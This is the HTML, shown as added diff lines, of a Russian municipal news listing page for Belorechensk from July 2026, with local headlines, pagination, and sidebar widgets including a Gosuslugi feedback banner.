+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-15T08:03:53+03:00" itemprop="datePublished">
+					Опубликовано: 15 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5963-uvazhaemye-zhiteli-i-gosti-goroda-napominaem-vam-o-zaprete-fotografirovaniya-video-i-ili-kinosemki-primeneniya-i-posledstvij-primeneniya-bpla"><img
+			 src="/images/news/2026/07/bespilotnik-dron-bpla-ataka-ne-snimat.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5963-uvazhaemye-zhiteli-i-gosti-goroda-napominaem-vam-o-zaprete-fotografirovaniya-video-i-ili-kinosemki-primeneniya-i-posledstvij-primeneniya-bpla" itemprop="url" aria-label="Подробнее:  Уважаемые жители и гости города! Напоминаем Вам о запрете фотографирования, видео- и (или) киносъемки применения и последствий применения БПЛА">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-10"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5961-belorechenskoj-transportnoj-prokuraturoj-vyyavleny-narusheniya-v-deyatelnosti-okhrannoj-organizatsii" itemprop="url">
+						Белореченской транспортной прокуратурой выявлены нарушения в деятельности охранной организации					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-13T16:33:37+03:00" itemprop="datePublished">
+					Опубликовано: 13 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5961-belorechenskoj-transportnoj-prokuraturoj-vyyavleny-narusheniya-v-deyatelnosti-okhrannoj-organizatsii"><img
+			 src="/images/news/2026/07/transprok1100-1.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5961-belorechenskoj-transportnoj-prokuraturoj-vyyavleny-narusheniya-v-deyatelnosti-okhrannoj-organizatsii" itemprop="url" aria-label="Подробнее:  Белореченской транспортной прокуратурой выявлены нарушения в деятельности охранной организации">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-11"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5960-protokoly-o-provedenii-konkursa-o-predostavlenii-prava-razmeshcheniya-nto-na-territorii-belorechenskogo-gorodskogo-poseleniya" itemprop="url">
+						Протоколы о проведении Конкурса о предоставлении права размещения НТО на территории Белореченского городского поселения					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-13T16:27:54+03:00" itemprop="datePublished">
+					Опубликовано: 13 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5960-protokoly-o-provedenii-konkursa-o-predostavlenii-prava-razmeshcheniya-nto-na-territorii-belorechenskogo-gorodskogo-poseleniya" itemprop="url" aria-label="Подробнее:  Протоколы о проведении Конкурса о предоставлении права размещения НТО на территории Белореченского городского поселения">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-12"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5959-esli-poluchili-dosudebnuyu-pretenziyu-srochno-pogasite-dolg" itemprop="url">
+						  Если получили досудебную претензию — срочно погасите долг!					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-13T16:21:54+03:00" itemprop="datePublished">
+					Опубликовано: 13 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5959-esli-poluchili-dosudebnuyu-pretenziyu-srochno-pogasite-dolg"><img
+			 src="/images/news/2026/07/ireazdJPEG.png" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5959-esli-poluchili-dosudebnuyu-pretenziyu-srochno-pogasite-dolg" itemprop="url" aria-label="Подробнее:    Если получили досудебную претензию — срочно погасите долг!">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-13"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5958-dan-start-regionalnomu-etapu-i-vserossijskogo-konkursa-professionalnogo-masterstva-rabotnits-promyshlennykh-predpriyatij-i-proizvodstv-a-nu-ka-devushki" itemprop="url">
+						Дан старт региональному этапу I Всероссийского Конкурса профессионального мастерства работниц промышленных предприятий и производств «А ну-ка, девушки!»					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-13T07:25:33+03:00" itemprop="datePublished">
+					Опубликовано: 13 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5958-dan-start-regionalnomu-etapu-i-vserossijskogo-konkursa-professionalnogo-masterstva-rabotnits-promyshlennykh-predpriyatij-i-proizvodstv-a-nu-ka-devushki"><img
+			 src="/images/news/2026/07/vu4oi2dBzQbL6Jl7nbkS.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5958-dan-start-regionalnomu-etapu-i-vserossijskogo-konkursa-professionalnogo-masterstva-rabotnits-promyshlennykh-predpriyatij-i-proizvodstv-a-nu-ka-devushki" itemprop="url" aria-label="Подробнее:  Дан старт региональному этапу I Всероссийского Конкурса профессионального мастерства работниц промышленных предприятий и производств «А ну-ка, девушки!»">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-14"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5957-trebovaniya-pozharnoj-bezopasnosti-pri-ispolzovaniya-otkrytogo-ognya-i-razvedeniyu-kostrov" itemprop="url">
+						ТРЕБОВАНИЯ ПОЖАРНОЙ БЕЗОПАСНОСТИ  ПРИ ИСПОЛЬЗОВАНИЯ ОТКРЫТОГО ОГНЯ  И РАЗВЕДЕНИЮ КОСТРОВ					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-10T08:31:21+03:00" itemprop="datePublished">
+					Опубликовано: 10 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5957-trebovaniya-pozharnoj-bezopasnosti-pri-ispolzovaniya-otkrytogo-ognya-i-razvedeniyu-kostrov"><img
+			 src="/images/news/2026/07/p31-972x479-f63.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5957-trebovaniya-pozharnoj-bezopasnosti-pri-ispolzovaniya-otkrytogo-ognya-i-razvedeniyu-kostrov" itemprop="url" aria-label="Подробнее:  ТРЕБОВАНИЯ ПОЖАРНОЙ БЕЗОПАСНОСТИ  ПРИ ИСПОЛЬЗОВАНИЯ ОТКРЫТОГО ОГНЯ  И РАЗВЕДЕНИЮ КОСТРОВ">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-15"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5956-s-miru-po-nitke-v-belorechenske-pered-sudom-predstanut-sotrudniki-torgovoj-firmy" itemprop="url">
+						«С миру по нитке»: в Белореченске перед судом предстанут сотрудники торговой фирмы					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-10T07:45:27+03:00" itemprop="datePublished">
+					Опубликовано: 10 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5956-s-miru-po-nitke-v-belorechenske-pered-sudom-predstanut-sotrudniki-torgovoj-firmy"><img
+			 src="/images/news/2026/07/regnum_picture_162670816965284_social.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5956-s-miru-po-nitke-v-belorechenske-pered-sudom-predstanut-sotrudniki-torgovoj-firmy" itemprop="url" aria-label="Подробнее:  «С миру по нитке»: в Белореченске перед судом предстанут сотрудники торговой фирмы">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-16"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5955-napomnite-detyam-o-bezopasnosti-na-letnikh-kanikulakh" itemprop="url">
+						Напомните детям о безопасности на летних каникулах					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-09T11:07:51+03:00" itemprop="datePublished">
+					Опубликовано: 09 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5955-napomnite-detyam-o-bezopasnosti-na-letnikh-kanikulakh"><img
+			 src="/images/news/2026/07/a86a78ab6d6d0621561fff36c9b7d498.png" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5955-napomnite-detyam-o-bezopasnosti-na-letnikh-kanikulakh" itemprop="url" aria-label="Подробнее:  Напомните детям о безопасности на летних каникулах">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-17"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5953-ob-ugolovnoj-otvetstvennosti-za-roznichnuyu-prodazhu-tabachnoj-produktsii-i-nikotinsoderzhashchej-produktsii-bez-litsenzii" itemprop="url">
+						Об уголовной ответственности за розничную продажу табачной продукции и никотинсодержащей продукции без лицензии					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-08T15:28:28+03:00" itemprop="datePublished">
+					Опубликовано: 08 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5953-ob-ugolovnoj-otvetstvennosti-za-roznichnuyu-prodazhu-tabachnoj-produktsii-i-nikotinsoderzhashchej-produktsii-bez-litsenzii" itemprop="url" aria-label="Подробнее:  Об уголовной ответственности за розничную продажу табачной продукции и никотинсодержащей продукции без лицензии">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-18"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5952-sbg" itemprop="url">
+						ВНИМАНИЕ! Штормовое предупреждение 					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-08T14:50:24+03:00" itemprop="datePublished">
+					Опубликовано: 08 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5952-sbg"><img
+			 src="/images/news/2026/07/img_7567.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5952-sbg" itemprop="url" aria-label="Подробнее:  ВНИМАНИЕ! Штормовое предупреждение ">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-19"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5951-bolshe-chem-lyubov-42-goda-vmeste-istoriya-pary-militsionerov-lyudmily-i-nikolaya-bychenko" itemprop="url">
+						Больше, чем любовь: 42 года вместе — история пары милиционеров Людмилы и Николая Быченко					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-08T13:31:14+03:00" itemprop="datePublished">
+					Опубликовано: 08 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5951-bolshe-chem-lyubov-42-goda-vmeste-istoriya-pary-militsionerov-lyudmily-i-nikolaya-bychenko"><img
+			 src="/images/news/2026/07/20260706_102022.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5951-bolshe-chem-lyubov-42-goda-vmeste-istoriya-pary-militsionerov-lyudmily-i-nikolaya-bychenko" itemprop="url" aria-label="Подробнее:  Больше, чем любовь: 42 года вместе — история пары милиционеров Людмилы и Николая Быченко">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+									</div><!-- end items-leading -->
+	
+	
+	
+	
+				<div class="pagination">
+							<p class="counter pull-right"> Страница 1 из 254 </p>
+						<ul>
+	<li class="pagination-start"><span class="pagenav">В начало</span></li>
+	<li class="pagination-prev"><span class="pagenav">Назад</span></li>
+			<li><span class="pagenav">1</span></li>			<li><a href="/?start=20" class="pagenav">2</a></li>			<li><a href="/?start=40" class="pagenav">3</a></li>			<li><a href="/?start=60" class="pagenav">4</a></li>			<li><a href="/?start=80" class="pagenav">5</a></li>			<li><a href="/?start=100" class="pagenav">6</a></li>			<li><a href="/?start=120" class="pagenav">7</a></li>			<li><a href="/?start=140" class="pagenav">8</a></li>			<li><a href="/?start=160" class="pagenav">9</a></li>			<li><a href="/?start=180" class="pagenav">10</a></li>		<li class="pagination-next"><a title="Вперед" href="/?start=20" class="hasTooltip pagenav">Вперед</a></li>
+	<li class="pagination-end"><a title="В конец" href="/?start=5060" class="hasTooltip pagenav">В конец</a></li>
+</ul>
+ </div>
+	</div>
+
+                        </article>
+                    </div>
+                    
+                    <div id="content-r" class="col-lg-4 d-flex flex-column">
+                        <aside>
+                            		<div class="moduletable">
+						
+
+<div class="custom"  >
+	<iframe  frameborder="no" scrolling="no" width="150" height="200" src="https://yandex.ru/time/widget/?geoid=35&lang=ru&layout=vert&type=digital&face=serif" style="border: 1px solid #ffeca6;"></iframe></div>
+		</div>
+			<div class="moduletable">
+						<div id="module_special_visually" class="module_special_visually handle_module horizontal topfixed  ">
+	<form id="special_visually" action="" method="POST">
+					<div class="buttons ">
+				<input
+					id="button_type_version"
+					type="radio"
+					name="type_version"
+					value="yes"
+				/>
+				<label
+					for="button_type_version"
+				>Версия для слабовидящих			</div>
+			</form>
+</div>		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><a href="https://clck.yandex.ru/redir/dtype=stred/pid=7/cid=1228/*https://yandex.ru/pogoda/10988" target="_blank" rel="noopener noreferrer"><img src="https://info.weather.yandex.net/10988/2_white.ru.png?domain=ru" alt="Яндекс.Погода" border="0" /><img src="https://clck.yandex.ru/click/dtype=stred/pid=7/cid=1227/*https://img.yandex.ru/i/pix.gif" alt="" width="1" height="1" border="0" /></a></p></div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<div id="e329fb40-widget-pos" style="width: 320px; height: 577px; border: 1px solid gray;">&nbsp;</div>
+<script src="https://pos.gosuslugi.ru/og/widget/js/main.js" id="e329fb40" data-src-host="https://pos.gosuslugi.ru/og" data-org-id="2725"></script></div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<script src='https://pos.gosuslugi.ru/bin/script.min.js'></script> 
+<style>
+#js-show-iframe-wrapper{position:relative;display:flex;align-items:center;justify-content:center;width:100%;min-width:293px;max-width:100%;background:linear-gradient(138.4deg,#38bafe 26.49%,#2d73bc 79.45%);color:#fff;cursor:pointer}#js-show-iframe-wrapper .pos-banner-fluid *{box-sizing:border-box}#js-show-iframe-wrapper .pos-banner-fluid .pos-banner-btn_2{display:block;width:240px;min-height:56px;font-size:18px;line-height:24px;cursor:pointer;background:#0d4cd3;color:#fff;border:none;border-radius:8px;outline:0}#js-show-iframe-wrapper .pos-banner-fluid .pos-banner-btn_2:hover{background:#1d5deb}#js-show-iframe-wrapper .pos-banner-fluid .pos-banner-btn_2:focus{background:#2a63ad}#js-show-iframe-wrapper .pos-banner-fluid .pos-banner-btn_2:active{background:#2a63ad}@-webkit-keyframes fadeInFromNone{0%{display:none;opacity:0}1%{display:block;opacity:0}100%{display:block;opacity:1}}@keyframes fadeInFromNone{0%{display:none;opacity:0}1%{display:block;opacity:0}100%{display:block;opacity:1}}@font-face{font-family:LatoWebLight;src:url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Light.woff2) format("woff2"),url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Light.woff) format("woff"),url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Light.ttf) format("truetype");font-style:normal;font-weight:400}@font-face{font-family:LatoWeb;src:url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Regular.woff2) format("woff2"),url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Regular.woff) format("woff"),url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Regular.ttf) format("truetype");font-style:normal;font-weight:400}@font-face{font-family:LatoWebBold;src:url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Bold.woff2) format("woff2"),url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Bold.woff) format("woff"),url(https://pos.gosuslugi.ru/bin/fonts/Lato/fonts/Lato-Bold.ttf) format("truetype");font-style:normal;font-weight:400}
+</style>
+
+<style>
+#js-show-iframe-wrapper .bf-2{position:relative;display:grid;grid-template-columns:var(--pos-banner-fluid-2__grid-template-columns);grid-template-rows:var(--pos-banner-fluid-2__grid-template-rows);width:100%;max-width:1060px;font-family:LatoWeb,sans-serif;box-sizing:border-box}#js-show-iframe-wrapper .bf-2__decor{grid-column:var(--pos-banner-fluid-2__decor-grid-column);grid-row:var(--pos-banner-fluid-2__decor-grid-row);padding:var(--pos-banner-fluid-2__decor-padding);background:var(--pos-banner-fluid-2__bg-url) var(--pos-banner-fluid-2__bg-position) no-repeat;background-size:var(--pos-banner-fluid-2__bg-size)}#js-show-iframe-wrapper .bf-2__logo-wrap{position:absolute;top:var(--pos-banner-fluid-2__logo-wrap-top);bottom:var(--pos-banner-fluid-2__logo-wrap-bottom);right:0;display:flex;flex-direction:column;align-items:flex-end;padding:var(--pos-banner-fluid-2__logo-wrap-padding);background:#2d73bc;border-radius:var(--pos-banner-fluid-2__logo-wrap-border-radius)}#js-show-iframe-wrapper .bf-2__logo{width:128px}#js-show-iframe-wrapper .bf-2__slogan{font-family:LatoWebBold,sans-serif;font-size:var(--pos-banner-fluid-2__slogan-font-size);line-height:var(--pos-banner-fluid-2__slogan-line-height);color:#fff}#js-show-iframe-wrapper .bf-2__content{padding:var(--pos-banner-fluid-2__content-padding)}#js-show-iframe-wrapper .bf-2__description{display:flex;flex-direction:column;margin-bottom:24px}#js-show-iframe-wrapper .bf-2__text{margin-bottom:12px;font-size:24px;line-height:32px;font-family:LatoWebBold,sans-serif;color:#fff}#js-show-iframe-wrapper .bf-2__text_small{margin-bottom:0;font-size:16px;line-height:24px;font-family:LatoWeb,sans-serif}#js-show-iframe-wrapper .bf-2__btn-wrap{display:flex;align-items:center;justify-content:center}
+</style >
+<div id='js-show-iframe-wrapper'>
+  <div class='pos-banner-fluid bf-2'>
+
+    <div class='bf-2__decor'>
+      <div class='bf-2__logo-wrap'>
+        <img
+          class='bf-2__logo'
+          src='https://pos.gosuslugi.ru/bin/banner-fluid/gosuslugi-logo.svg'
+          alt='Госуслуги'
+        />
+        <div class='bf-2__slogan'>Решаем вместе</div >
+      </div >
+    </div >
+    <div class='bf-2__content'>
+
+      <div class='bf-2__description'>
+          <span class='bf-2__text'>
+            Не убран мусор, яма на дороге, не горит фонарь?
+          </span >
+        <span class='bf-2__text bf-2__text_small'>
+            Столкнулись с проблемой&nbsp;— сообщите о ней!
+          </span >
+      </div >
+
+      <div class='bf-2__btn-wrap'>
+        <!-- pos-banner-btn_2 не удалять; другие классы не добавлять -->
+        <button
+          class='pos-banner-btn_2'
+          type='button'
+        >Сообщить о проблеме
+        </button >
+      </div >
+
+    </div >
+
+  </div >
+</div >
+<script>
+
+(function(){
+"use strict";function ownKeys(e,t){var o=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);if(t)n=n.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable});o.push.apply(o,n)}return o}function _objectSpread(e){for(var t=1;t<arguments.length;t++){var o=null!=arguments[t]?arguments[t]:{};if(t%2)ownKeys(Object(o),true).forEach(function(t){_defineProperty(e,t,o[t])});else if(Object.getOwnPropertyDescriptors)Object.defineProperties(e,Object.getOwnPropertyDescriptors(o));else ownKeys(Object(o)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(o,t))})}return e}function _defineProperty(e,t,o){if(t in e)Object.defineProperty(e,t,{value:o,enumerable:true,configurable:true,writable:true});else e[t]=o;return e}var POS_PREFIX_2="--pos-banner-fluid-2__",posOptionsInitial={"grid-template-columns":"100%","grid-template-rows":"310px auto","decor-grid-column":"initial","decor-grid-row":"initial","decor-padding":"30px 30px 0 30px","bg-url":"url('https://pos.gosuslugi.ru/bin/banner-fluid/2/banner-fluid-bg-2-small.svg')","bg-position":"calc(10% + 64px) calc(100% - 20px)","bg-size":"cover","content-padding":"0 30px 30px 30px","slogan-font-size":"20px","slogan-line-height":"32px","logo-wrap-padding":"20px 30px 30px 40px","logo-wrap-top":"0","logo-wrap-bottom":"initial","logo-wrap-border-radius":"0 0 0 80px"},setStyles=function(e,t){Object.keys(e).forEach(function(o){t.style.setProperty(POS_PREFIX_2+o,e[o])})},removeStyles=function(e,t){Object.keys(e).forEach(function(e){t.style.removeProperty(POS_PREFIX_2+e)})};function changePosBannerOnResize(){var e=document.documentElement,t=_objectSpread({},posOptionsInitial),o=document.getElementById("js-show-iframe-wrapper"),n=o?o.offsetWidth:document.body.offsetWidth;if(n>405)t["slogan-font-size"]="24px",t["logo-wrap-padding"]="30px 50px 30px 70px";if(n>500)t["grid-template-columns"]="min-content 1fr",t["grid-template-rows"]="100%",t["decor-grid-column"]="2",t["decor-grid-row"]="1",t["decor-padding"]="30px 30px 30px 0",t["content-padding"]="30px",t["bg-position"]="0% calc(100% - 70px)",t["logo-wrap-padding"]="30px 30px 24px 40px",t["logo-wrap-top"]="initial",t["logo-wrap-bottom"]="0",t["logo-wrap-border-radius"]="80px 0 0 0";if(n>585)t["bg-position"]="0% calc(100% - 6px)";if(n>800)t["bg-url"]="url('https://pos.gosuslugi.ru/bin/banner-fluid/2/banner-fluid-bg-2.svg')",t["bg-position"]="0% center";if(n>1020)t["slogan-font-size"]="32px",t["line-height"]="40px",t["logo-wrap-padding"]="30px 30px 24px 50px";setStyles(t,e)}changePosBannerOnResize(),window.addEventListener("resize",changePosBannerOnResize),window.onunload=function(){var e=document.documentElement;window.removeEventListener("resize",changePosBannerOnResize),removeStyles(posOptionsInitial,e)};
+})()
+</script>
+ <script>Widget("https://pos.gosuslugi.ru/form", 227768)</script></div>
+		</div>
+			<div class="moduletable">
+						<div class="accordeonck ">
+<ul class="menu" id="accordeonck132">
+<li id="item-108" class="accordeonck item108 first parent parent level1 " data-level="1" ><span class="accordeonck_outer toggler toggler_1"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Администрация<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_1" style="display:none;"><li id="item-116" class="accordeonck item116 first level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/glava-goroda" >Глава города<span class="accordeonckdesc"></span></a></span></li><li id="item-118" class="accordeonck item118 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/struktura" >Структура<span class="accordeonckdesc"></span></a></span></li><li id="item-179" class="accordeonck item179 parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Документы<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-339" class="accordeonck item339 first level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/dokumenty/spravochno" >Справочно<span class="accordeonckdesc"></span></a></span></li><li id="item-178" class="accordeonck item178 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/dokumenty/ustav-poseleniya" >Устав поселения<span class="accordeonckdesc"></span></a></span></li><li id="item-181" class="accordeonck item181 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/dokumenty/postanovleniya-obnarodovanie" >Постановления (обнародование)<span class="accordeonckdesc"></span></a></span></li><li id="item-183" class="accordeonck item183 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/dokumenty/spravki-o-dokhodakh" >Сведения о доходах<span class="accordeonckdesc"></span></a></span></li><li id="item-283" class="accordeonck item283 last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/dokumenty/tekhnologicheskie-skhemy" >Технологические схемы<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-201" class="accordeonck item201 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/polnomochiya" >Полномочия<span class="accordeonckdesc"></span></a></span></li><li id="item-202" class="accordeonck item202 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/kadrovaya-rabota" >Кадровая работа<span class="accordeonckdesc"></span></a></span></li><li id="item-203" class="accordeonck item203 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/deyatelnost-administrativnoj-komissii" >Деятельность административной комиссии<span class="accordeonckdesc"></span></a></span></li><li id="item-264" class="accordeonck item264 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/territorialnaya-komissiya" >Территориальная комиссия<span class="accordeonckdesc"></span></a></span></li><li id="item-337" class="accordeonck item337 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/o-gorode" >О городе<span class="accordeonckdesc"></span></a></span></li><li id="item-117" class="accordeonck item117 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/kontakty" >Контакты<span class="accordeonckdesc"></span></a></span></li><li id="item-359" class="accordeonck item359 last level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/administratsiya/besplatnaya-yuridicheskaya-pomoshch" >Бесплатная юридическая помощь<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-198" class="accordeonck item198 parent parent level1 " data-level="1" ><span class="accordeonck_outer toggler toggler_1"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Социальная сфера<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_1" style="display:none;"><li id="item-204" class="accordeonck item204 first parent parent level2 " data-level="2" ><span 